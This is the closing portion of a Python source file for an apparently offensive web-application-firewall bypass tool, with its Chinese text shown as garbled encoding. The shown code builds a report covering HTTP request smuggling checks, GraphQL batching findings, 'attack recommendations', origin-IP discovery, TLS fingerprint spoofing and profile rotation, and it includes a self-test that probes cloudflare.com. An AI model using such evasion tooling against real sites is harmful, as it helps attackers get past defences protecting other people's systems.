                report.append(f"  - åŸºå‡†çŠ¶æ€: {smuggling['baseline_status']} ({smuggling['baseline_time']:.2f}s)")
                report.append(f"  - ç¡®è®¤çŠ¶æ€: {smuggling['confirmation_status']} ({smuggling['confirmation_time']:.2f}s)")
            else:
                report.append(f"\n[èµ°ç§æ¼æ´] âœ“ æœªå‘ç°HTTPè¯·æ±‚èµ°ç§æ¼æ´")
        
        # GraphQLæ¼æ´æ‰«æç»“æœ
        if 'graphql_scan' in results:
            graphql = results['graphql_scan']
            if graphql['vulnerable']:
                report.append(f"\n[GraphQLæ¼æ´] âš ï¸ å‘ç°GraphQLæ‰¹å¤„ç†æ¼æ´ï¼")
                report.append(f"  - æ”»å‡»ç«¯ç‚¹: {graphql['endpoint']}")
                report.append(f"  - æ¼æ´è¯æ®: {graphql['evidence']}")
                report.append(f"  - æˆåŠŸæŸ¥è¯¢: {graphql['successful_queries']}/{graphql['total_queries']}")
                report.append(f"  - ç½®ä¿¡åº¦: {graphql['confidence']:.1%}")
                report.append(f"  - å†…çœçŠ¶æ€: {'å¯ç”¨' if graphql['introspection_available'] else 'è¢«ç¦ç”¨'}")
            else:
                report.append(f"\n[GraphQLæ¼æ´] âœ“ æœªå‘ç°GraphQLæ‰¹å¤„ç†æ¼æ´")
        
        if results['recommendations']:
            report.append("\n[æ”»å‡»å»ºè®®]")
            for i, rec in enumerate(results['recommendations'], 1):
                report.append(f"  {i}. {rec}")
        
        report.append("\n[ç»Ÿè®¡ä¿¡æ¯]")
        report.append(f"  æ€»å°è¯•æ¬¡æ•°: {self.stats['total_attempts']}")
        report.append(f"  æˆåŠŸç»•è¿‡æ¬¡æ•°: {self.stats['successful_bypasses']}")
        report.append(f"  å‘ç°æºç«™IPæ€»æ•°: {self.stats['origin_ips_found']}")
        report.append(f"  é‡åˆ°çš„WAFç±»å‹: {', '.join(self.stats['waf_types_encountered'])}")
        
        # TLS-Clientç»Ÿè®¡
        if TLS_CLIENT_AVAILABLE:
            total_requests = self.stats['tls_client_successes'] + self.stats['traditional_method_successes']
            if total_requests > 0:
                tls_success_rate = (self.stats['tls_client_successes'] / total_requests) * 100
                report.append(f"  TLS-ClientæˆåŠŸç‡: {tls_success_rate:.1f}%")
                report.append(f"  TLS-Clientè¯·æ±‚: {self.stats['tls_client_successes']} æ¬¡")
                report.append(f"  ä¼ ç»Ÿæ–¹æ³•è¯·æ±‚: {self.stats['traditional_method_successes']} æ¬¡")
        
        report.append("\n[æŠ€æœ¯èƒ½åŠ›]")
        report.append("  æºç«™å‘ç°æŠ€æœ¯: 9ç§ (å«JARMæŒ‡çº¹ã€SSL SANåˆ†æ)")
        report.append("  ç¼–ç ç»•è¿‡æŠ€æœ¯: 8ç§ (å«UTF-8 Overlong)")
        report.append("  é«˜çº§ç»•è¿‡æŠ€æœ¯: 13ç§ (å«è¾¹ç¼˜æ¡ˆä¾‹ã€è¯·æ±‚èµ°ç§)")
        report.append("  WAFæŒ‡çº¹åº“: 8ç§ä¸»æµWAF")
        report.append("  âš¡ HTTPè¯·æ±‚èµ°ç§: æ™ºèƒ½åŒ–åˆ¶å¯¼ç¡®è®¤ç³»ç»Ÿ")
        report.append("    - 6ç§èµ°ç§æŠ€æœ¯ (CL.TE, TE.CL, TE.TE + å˜ä½“)")
        report.append("    - åŸºå‡†-æ¢é’ˆ-ç¡®è®¤ä¸‰æ­¥æ£€æµ‹æ³•")
        report.append("    - æ—¶é—´å¼‚å¸¸å’ŒçŠ¶æ€ç å¼‚å¸¸åŒé‡åˆ†æ")
        
        # TLS-Clientèƒ½åŠ› - 10ç§æŒ‡çº¹æè‡´ä¼˜åŒ–
        if TLS_CLIENT_AVAILABLE:
            report.append(f"  æµè§ˆå™¨æŒ‡çº¹: {len(self.browser_profiles)}ç§")
            report.append("  TLSæŒ‡çº¹ä¼ªè£…: âœ“ JA3/JA3S/H2æŒ‡çº¹ + GREASE + å¯†ç å¥—ä»¶é¡ºåº")
            
            # æŒ‡çº¹ä½¿ç”¨ç»Ÿè®¡
            if any(self.stats['profile_usage'].values()):
                report.append("\n[æŒ‡çº¹ä½¿ç”¨ç»Ÿè®¡]")
                for profile, usage_count in self.stats['profile_usage'].items():
                    if usage_count > 0:
                        success_count = self.stats['profile_success'][profile]
                        success_rate = (success_count / usage_count) * 100
                        category = self.browser_profiles.get(profile, {}).get('category', 'unknown')
                        report.append(f"  {profile}: {usage_count}æ¬¡ä½¿ç”¨, {success_rate:.1f}%æˆåŠŸç‡ ({category})")
                
                # è¢«å°æŒ‡çº¹
                if self.profile_rotation['blocked_profiles']:
                    report.append(f"  è¢«å°æŒ‡çº¹: {', '.join(self.profile_rotation['blocked_profiles'])}")
        else:
            report.append("  TLSæŒ‡çº¹ä¼ªè£…: âœ— éœ€è¦å®‰è£… tls-client åº“")
        
        # ShodançŠ¶æ€
        if self.shodan_client:
            report.append("\n[Shodané›†æˆ]")
            report.append("  çŠ¶æ€: âœ“ å·²å¯ç”¨")
            report.append("  åŠŸèƒ½: JARMæœç´¢ã€Faviconå“ˆå¸Œã€SSLè¯ä¹¦æœç´¢ã€å“åº”å¤´åŒ¹é…")
        else:
            report.append("\n[Shodané›†æˆ]")
            report.append("  çŠ¶æ€: âœ— æœªå¯ç”¨")
            report.append("  åŸå› : æœªé…ç½®APIå¯†é’¥æˆ–æœªå®‰è£…shodanåº“")
        
        report.append("\n[ç¼“å­˜ç»Ÿè®¡]")
        total_cache_requests = self._cache_hits + self._cache_misses
        if total_cache_requests > 0:
            hit_rate = (self._cache_hits / total_cache_requests) * 100
            report.append(f"  ç¼“å­˜å‘½ä¸­ç‡: {hit_rate:.1f}%")
            report.append(f"  ç¼“å­˜å‘½ä¸­: {self._cache_hits} æ¬¡")
            report.append(f"  ç¼“å­˜æœªå‘½ä¸­: {self._cache_misses} æ¬¡")
            report.append(f"  ç¼“å­˜ç±»å‹: {', '.join(self._cache.keys())}")
        else:
            report.append("  æš‚æ— ç¼“å­˜ç»Ÿè®¡æ•°æ®")
        
        report.append("=" * 80)
        
        return '\n'.join(report)

    async def self_test(self) -> bool:
        """
        æ‰§è¡Œæ¨¡å—è‡ªæ£€ï¼Œç¡®ä¿æ‰€æœ‰æ ¸å¿ƒä¾èµ–å’ŒåŠŸèƒ½éƒ½æ­£å¸¸ã€‚
        è¿”å› True è¡¨ç¤ºè‡ªæ£€é€šè¿‡ï¼Œå¦åˆ™è¿”å› Falseã€‚
        """
        self.logger.info("\n" + "="*50)
        self.logger.info("[*] WAFBypasser æ¨¡å—å¯åŠ¨è‡ªæ£€...")
        self.logger.info("="*50)
        
        all_checks_passed = True
        
        # 1. æ£€æŸ¥TLS-Clientåº“
        if TLS_CLIENT_AVAILABLE and self.tls_sessions:
            self.logger.info("    [+] ä¾èµ–æ£€æŸ¥: TLS-Client æ ¸å¿ƒåº“ ... OK")
        else:
            self.logger.error("    [!] ä¾èµ–æ£€æŸ¥: TLS-Client æ ¸å¿ƒåº“ ... å¤±è´¥! (ç»•è¿‡èƒ½åŠ›ä¸¥é‡å—é™)")
            all_checks_passed = False

        # 2. æ£€æŸ¥Shodan API Key
        if self.shodan_client:
            try:
                # å¼‚æ­¥æ‰§è¡ŒåŒæ­¥çš„API infoè°ƒç”¨
                shodan_info = await asyncio.to_thread(self.shodan_client.info)
                credits = shodan_info.get('query_credits', 0)
                self.logger.info(f"    [+] ä¾èµ–æ£€æŸ¥: Shodan API Key ... OK (æŸ¥è¯¢ç‚¹æ•°: {credits})")
            except Exception as e:
                self.logger.error(f"    [!] ä¾èµ–æ£€æŸ¥: Shodan API Key ... å¤±è´¥! ({e})")
                all_checks_passed = False
        else:
            self.logger.warning("    [~] ä¾èµ–æ£€æŸ¥: Shodan API ... æœªé…ç½® (éƒ¨åˆ†æºç«™å‘ç°åŠŸèƒ½ä¸å¯ç”¨)")

        # 3. æ ¸å¿ƒåŠŸèƒ½è¿é€šæ€§æµ‹è¯•
        try:
            test_url = "https://www.cloudflare.com" # ä¸€ä¸ªå¿…ç„¶å­˜åœ¨çš„æµ‹è¯•ç›®æ ‡
            self.logger.info(f"    [*] è¿é€šæ€§æµ‹è¯•: æ­£åœ¨å‘ {test_url} å‘é€æ¢æµ‹è¯·æ±‚...")
            resp = await self._make_tls_request(test_url, profile='chrome_120')
            if 200 <= resp['status_code'] < 400:
                self.logger.info(f"    [+] è¿é€šæ€§æµ‹è¯•: TLS è¯·æ±‚å¼•æ“ ... OK (çŠ¶æ€ç : {resp['status_code']})")
            else:
                self.logger.error(f"    [!] è¿é€šæ€§æµ‹è¯•: TLS è¯·æ±‚å¼•æ“ ... å¤±è´¥ (çŠ¶æ€ç : {resp['status_code']})")
                all_checks_passed = False
        except Exception as e:
            self.logger.error(f"    [!] è¿é€šæ€§æµ‹è¯•: TLS è¯·æ±‚å¼•æ“ ... å¼‚å¸¸! ({type(e).__name__} - {e})")
            all_checks_passed = False

        self.logger.info("="*50)
        if all_checks_passed:
            self.logger.info("[+] è‡ªæ£€å®Œæˆï¼šæ‰€æœ‰æ ¸å¿ƒåŠŸèƒ½æ­£å¸¸ã€‚æ¨¡å—å‡†å¤‡å°±ç»ªï¼")
        else:
            self.logger.error("[!] è‡ªæ£€å¤±è´¥ï¼šéƒ¨åˆ†æ ¸å¿ƒåŠŸèƒ½å¼‚å¸¸ï¼Œè¯·æ£€æŸ¥é…ç½®å’Œä¾èµ–ï¼")
        self.logger.info("="*50 + "\n")
        
        return all_checks_passed


if __name__ == "__main__":
    async def quick_test():
        bypasser = WAFBypasser()  # ç°åœ¨è‡ªåŠ¨è¯»å–ç¯å¢ƒå˜é‡
        await bypasser.self_test()
    
    asyncio.run(quick_test())
